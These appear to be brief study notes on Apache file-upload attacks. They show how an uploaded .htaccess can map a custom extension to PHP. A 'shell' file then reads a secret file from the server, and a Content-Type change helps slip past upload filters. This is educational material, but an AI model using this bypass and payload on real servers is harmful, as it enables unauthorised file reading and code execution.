To allow Apache to execute PHP files requested by a client, developers may need to add the following directives to /etc/apache2/apache2.conf:

`LoadModule php_module /usr/lib/apache2/modules/libphp.so
AddType application/x-httpd-php .php`

Apache servers, for example, will load a directory-specific configuration from a file called .htaccess

#Example

.htaccess 
`AddType application/x-httpd-php .whatever`

shell.whatever 
`<?php echo file_get_contents('/home/david/secret'); ?>`

*may need: Change the value of the Content-Type header to text/plain.
